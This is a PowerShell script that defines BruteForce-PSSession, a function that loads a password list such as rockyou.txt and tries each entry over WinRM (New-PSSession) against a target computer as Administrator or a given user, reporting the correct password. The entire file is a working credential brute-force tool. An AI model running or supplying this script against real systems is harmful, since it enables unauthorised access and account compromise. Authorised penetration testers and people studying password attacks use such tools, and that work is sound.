function BruteForce-PSSession {
    <#
    .SYNOPSIS
        Author - Simon Jones
        
        This script will load a password list and brute force a computer using WinRM.  NOTE. This can only be used on environments with poorly managed account security.
    .EXAMPLE
            BruteForce-PSSession -PasswordList C:\Users\Admin\Downloads\Rockyou.txt -ComputerName server01.contoso.com
        This example will load a passowrd list called 'Rockyou.txt' and attempt to connect to server01.contoso.com as Administrator using each entry in the list

            BruteForce-PSSession -PasswordList C:\Users\Admin\Downloads\Rockyou.txt -ComputerName server01.contoso.com -Uid joe.bloggs
        This example will load a passowrd list called 'Rockyou.txt' and attempt to connect to server01.contoso.com as joe.bloggs using each entry in the list
    .PARAMETER1
        $PasswordList
        A file containing a list of possible passwords.
    .PARAMETER2
        $ComputerName
        The name of the target computer.
    .PARAMETER3
        $Uid
        A username to conncect to the target computer as (If left undefind, then Administrator will be used) 
        
    #>
    [CmdletBinding()]
    param(

        [Parameter(Mandatory)]
        [string]$PasswordList,
        [Parameter(Mandatory)]
        [string]$ComputerName,
        [Parameter()]
        [string]$Uid = 'Administrator'
    
    )
    process{
            $rockyou = Get-Content -Path $PasswordList -ErrorAction stop
        
            foreach($pwd in $rockyou){
                $secpasswd = ConvertTo-SecureString $pwd -AsPlainText -Force
                $creds = New-Object System.Management.Automation.PSCredential ($Uid, $secpasswd)

                $Res = New-PSSession -ComputerName $ComputerName -Credential $creds -ErrorAction SilentlyContinue

                if(!($Res -eq $null)){
                    Write-Host "Password $pwd correct" -ForegroundColor Green
                    break
                }
                Else{
                    Write-Host "Password $pwd incorrect" -ForegroundColor Red
                }
            }
        }
    }
